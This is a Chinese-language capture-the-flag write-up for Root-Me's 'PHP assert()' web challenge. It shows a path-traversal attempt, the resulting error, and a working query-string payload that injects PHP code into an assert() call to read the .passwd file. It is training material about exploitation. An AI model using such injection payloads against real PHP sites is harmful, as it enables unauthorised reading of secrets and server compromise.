Root-Me [PHP assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
===

該頁面有三個選項 `Home`、`About`、`Contact`。

## 解題關鍵
1. GET Payload
2. PHP Basic

## 提示訊息
```
Find and exploit the vulnerability to read the file .passwd.
```

## 解題方法
能夠從頁面觀察上觀察到的變化只有切換 `Home`、`About`、`Contact` 時，URL 上的 `page` Payload，嘗試透過 `../../../.passwd` 讀取 `.passwd` 機密文件，跳出了以下訊息。  

```
Warning: assert(): Assertion "strpos('includes/../../../.passwd.php', '..') === false" failed in /challenge/web-serveur/ch47/index.php on line 8 Detected hacking attempt!
```

從訊息上可以發現，僅能讀取 `includes` 以下的檔案，並且會把後輟加上 `.php`，顧可以猜測程式碼如下。  

```php
if (assert(strpos('includes/' . $_GET['page'] . '.php', '..') === false))
```

隨後嘗試將 Payload 改為 `../../../.passwd,' ') || echo "Hello World"//`，雖然輸出結果有成功閉合，但還是回傳與法錯誤。  

最後是參考 `lyy289065406` 大大的解法，前後閉合，並使用 `print_r` 來輸出、`file_get_contents` 來讀檔。  

```
?page=',' ') || print_r(file_get_contents(".passwd"))|| strpos('
```

閉合後就會變成以下的狀態。  

```php
if (assert(strpos('includes/',' ') || print_r(file_get_contents(".passwd"))|| strpos('.php','..') === false) {
```


## Reference
[lyy289065406 - CTF-Solving-Reports - [19] [25P] PHP assert](https://github.com/lyy289065406/CTF-Solving-Reports/tree/master/rootme/Web-Server/%5B19%5D%20%5B25P%5D%20PHP%20assert)

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)